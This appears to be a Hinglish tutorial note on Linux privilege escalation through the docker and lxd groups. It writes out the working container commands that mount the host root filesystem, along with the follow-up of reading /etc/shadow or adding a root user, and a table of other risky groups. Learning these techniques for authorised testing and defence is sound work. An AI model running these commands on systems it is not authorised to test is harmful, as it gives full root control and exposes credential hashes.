# 👥 PrivEsc via User Groups (Docker & LXD)

## 1. Concept: Groups as a Security Hole

Linux mein jab aap `id` command chalate hain, toh aapko pata chalta hai ki aap kin groups ke member hain.

- Kuch groups (jaise `sudo`, `root`) obvious hain.
    
- Lekin `docker` aur `lxd` groups system-level permissions deti hain kyunki inka kaam containers manage karna hota hai, aur container engine aksar **Root** ke taur par run karta hai.
    

---

## 2. Docker Group Privilege Escalation

Agar aapka user `docker` group mein hai, toh aap system ki kisi bhi file ko (bale hi wo root ki ho) access kar sakte hain.

### Step-by-Step Process:

1. **Check Membership:** `id` command se check karein ki kya `docker` group dikh raha hai.
    
2. **The Exploit Logic:** Hum ek Docker container chalayenge aur system ki **Root Directory (`/`)** ko us container ke andar ek folder (e.g., `/mnt`) par mount kar denge.
    
3. **Command:**
    
    Bash
    
    ```
  docker run -v /:/mnt -it alpine chroot /mnt sh
    ```

- `-v /:/mnt`: Host machine ki root directory ko container ke `/mnt` folder se jod deta hai.    
- `chroot /mnt`: Ab container ke andar se aap host machine ki files ko root bankar edit kar sakte hain.


**Result:** Ab aap `/etc/shadow` padh sakte hain ya `/etc/passwd` mein naya root user add kar sakte hain.

---

## 3. LXD/LXC Group Privilege Escalation

LXD ek container manager hai. Agar user `lxd` group mein hai, toh ye Docker se bhi zyada lethal ho sakta hai.

### Step-by-Step Process:

LXD mein thoda process lamba hota hai kyunki humein aksar ek image build karke import karni padti hai.

1. **Check Membership:** `id` command se confirm karein.
    
2. **Build/Download Alpine Image:** (Apni attacker machine par)
    
    - `distrobuilder` ya pre-built images ka use karein.
        
3. **Import Image (Target machine par):**
    
    Bash
    
    ```
    lxc image import alpine.tar.gz --alias myimage
    ```
    
4. **Initialize & Create Container:**
    
    Bash
    
    ```
    lxc init myimage ignite -c security.privileged=true
    ```
    
    - `security.privileged=true`: Ye container ko host ke root permissions deta hai.
        
1. **Mount Host Root:**

```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

    *   Is command se host ki `/` (root) directory container ke `/mnt/root` par mount ho gayi.
    * 
2.  **Start and Enter:**

```
 lxc start ignite
    lxc exec ignite /bin/sh
```
2.  **Final Access:**

 Container ke andar `/mnt/root` par jayein. Ab aap host machine ke **Root** hain.

---

## 4. Other Dangerous Groups to Watch

| Group Name | Risk / Exploit |
| :--- | :--- |
| **Disk** | Direct access to hard drive blocks (`/dev/sda`). Binary data read/write possible. |
| **Video** | Framebuffer se screen capture ya inputs read karne ka chance. |
| **Shadow** | `/etc/shadow` file read karke hashes nikal sakte hain. |
| **Sudo** | Seedha `sudo -i` ya `sudo su` chalane ki permission. |

---